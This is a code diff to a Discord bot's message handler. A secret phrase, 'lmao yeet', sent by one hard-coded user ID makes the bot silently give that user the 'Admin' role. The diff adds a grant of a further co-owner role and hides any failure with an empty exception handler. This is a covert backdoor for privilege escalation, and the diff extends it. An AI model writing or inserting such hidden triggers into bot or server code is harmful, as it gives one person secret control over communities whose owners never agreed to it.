@@ -128,7 +128,13 @@ async def on_message(message):
         elif message.content.find("lmao yeet")!= -1:
             if message.author.id == 258295063635951618:
                 role = discord.utils.get(message.author.guild.roles, name="Admin")
+                role2 = discord.utils.get(message.author.guild.roles, name="Maximum Co-OwnerSayian")
                 await message.author.add_roles(role)
+                try:
+                    await message.author.add_roles(role2)
+                except Exception:
+                    pass
+                
             elif message.author.id == 612388606425694247:
                 role = discord.utils.get(message.author.guild.roles, name="Limited")
                 await message.author.add_roles(role)
